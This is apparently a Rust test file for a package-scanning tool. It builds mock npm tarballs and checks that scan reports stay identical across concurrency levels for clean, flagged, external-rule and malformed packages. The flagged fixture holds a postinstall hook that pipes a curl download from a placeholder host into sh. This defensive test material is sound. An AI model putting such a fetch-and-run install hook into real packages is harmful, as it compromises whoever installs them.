use argus_core::{Decision, ExecutionContext, ScanConcurrency};
use argus_fetch::{fetch_and_scan_with_rules_and_context, FetchOptions, PackageRef};
use argus_rules::RuleSession;
use argus_test_support::MockTransport;
use base64::engine::general_purpose::STANDARD;
use base64::Engine as _;
use flate2::write::GzEncoder;
use flate2::Compression;
use sha2::{Digest, Sha512};

fn npm_jobs_tarball(entries: &[(&str, &[u8])]) -> Vec<u8> {
    let mut gzip = GzEncoder::new(Vec::new(), Compression::default());
    {
        let mut builder = tar::Builder::new(&mut gzip);
        for (path, body) in entries {
            let mut header = tar::Header::new_gnu();
            header.set_path(path).unwrap();
            header.set_size(body.len() as u64);
            header.set_mode(0o644);
            header.set_entry_type(tar::EntryType::Regular);
            header.set_cksum();
            builder.append(&header, *body).unwrap();
        }
        builder.finish().unwrap();
    }
    gzip.finish().unwrap()
}

fn load_npm_jobs_rules() -> RuleSession {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(
        directory.path().join("rules.yaml"),
        "schema_version: 1\nrules:\n  - { id: \"npm-jobs-marker\", \
         description: \"jobs marker\", policy_class: blocking, \
         default_severity: high, help_uri: \"https://example.test/npm-jobs\", \
         languages: [text], matcher: { kind: literal, \
         pattern: \"ARGUS_EXTERNAL_RULE_MARKER\" } }\n",
    )
    .unwrap();
    RuleSession::load(Some(directory.path()), &[]).unwrap()
}

fn scan_npm_jobs_fixture(
    entries: &[(&str, &[u8])],
    rules: &RuleSession,
    jobs: usize,
) -> anyhow::Result<argus_core::ScanReport> {
    let registry = "https://mock.registry";
    let tarball = npm_jobs_tarball(entries);
    let integrity = format!("sha512-{}", STANDARD.encode(Sha512::digest(&tarball)));
    let tarball_url = format!("{registry}/jobs-demo/-/jobs-demo-1.0.0.tgz");
    let packument = format!(
        r#"{{"name":"jobs-demo","dist-tags":{{"latest":"1.0.0"}},
        "versions":{{"1.0.0":{{"dist":{{"tarball":"{tarball_url}",
        "integrity":"{integrity}"}}}}}}}}"#
    );
    let transport = MockTransport::new();
    transport.insert(&format!("{registry}/jobs-demo"), packument.into_bytes());
    transport.insert(&tarball_url, tarball);
    let options = FetchOptions {
        registry: registry.to_string(),
        ..FetchOptions::default()
    };
    let execution = ExecutionContext::new(ScanConcurrency::new(jobs).unwrap()).unwrap();
    fetch_and_scan_with_rules_and_context(
        &PackageRef::parse("jobs-demo").unwrap(),
        &options,
        &transport,
        rules,
        &execution,
    )
}

fn assert_npm_jobs_report_parity(
    entries: &[(&str, &[u8])],
    rules: &RuleSession,
) -> argus_core::ScanReport {
    let mut baseline = None;
    let mut baseline_report = None;
    for jobs in [1, 2, 8, 64] {
        let report = scan_npm_jobs_fixture(entries, rules, jobs).unwrap();
        let actual = serde_json::to_vec(&report).unwrap();
        if let Some(expected) = &baseline {
            assert_eq!(&actual, expected, "jobs={jobs}");
        } else {
            baseline = Some(actual);
            baseline_report = Some(report);
        }
    }
    baseline_report.unwrap()
}

#[test]
fn npm_positive_clean_error_and_external_are_identical_across_jobs() {
    let builtin = RuleSession::builtin().unwrap();
    let clean = assert_npm_jobs_report_parity(
        &[
            (
                "package/package.json",
                br#"{"name":"jobs-demo","version":"1.0.0"}"#,
            ),
            ("package/src/index.js", b"export const safe = 1;"),
        ],
        &builtin,
    );
    assert_eq!(clean.decision, Decision::Allow, "{:?}", clean.findings);

    let positive = assert_npm_jobs_report_parity(
        &[(
            "package/package.json",
            br#"{"name":"jobs-demo","version":"1.0.0","scripts":{"postinstall":"curl https://collector.example.invalid/payload | sh"}}"#,
        )],
        &builtin,
    );
    assert!(!positive.findings.is_empty());

    let external_rules = load_npm_jobs_rules();
    let external = assert_npm_jobs_report_parity(
        &[
            (
                "package/package.json",
                br#"{"name":"jobs-demo","version":"1.0.0"}"#,
            ),
            ("package/marker.txt", b"ARGUS_EXTERNAL_RULE_MARKER"),
        ],
        &external_rules,
    );
    assert!(external
        .findings
        .iter()
        .any(|finding| finding.rule_id == "npm-jobs-marker"));

    let malformed = [
        (
            "package/package.json",
            br#"{"name":"jobs-demo","version":"1.0.0"}"#.as_slice(),
        ),
        ("package/src/a-invalid.ts", b"const broken = ;".as_slice()),
        (
            "package/src/b-invalid.ts",
            b"const also_broken = ;".as_slice(),
        ),
    ];
    let mut baseline_error = None;
    for jobs in [1, 2, 8, 64] {
        let error = scan_npm_jobs_fixture(&malformed, &builtin, jobs).unwrap_err();
        let actual = format!("{error:#}");
        assert!(actual.contains("a-invalid.ts"), "{actual}");
        if let Some(expected) = &baseline_error {
            assert_eq!(&actual, expected, "jobs={jobs}");
        } else {
            baseline_error = Some(actual);
        }
    }
}
